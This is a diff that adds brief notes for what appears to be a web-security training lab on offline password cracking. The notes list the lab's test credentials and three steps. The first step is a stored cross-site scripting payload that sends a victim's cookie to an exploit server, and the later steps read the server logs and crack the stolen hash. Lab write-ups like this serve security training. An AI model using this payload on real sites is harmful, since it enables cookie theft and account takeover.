@@ -1,0 +1,11 @@
+Lab: Offline password cracking
+Notes: User's password hash in cookie.
+        XSS in comment functionality.
+Goal: To obtain stay-logged-in cookie
+Your credentials: wiener:peter
+Victim's username: carlos
+
+Analysis:
+(1) <script>document.location='expoitserver'+document.cookie</script>
+(2) Check logs of exploit server.
+(3) Crack stay-logged-in cookie
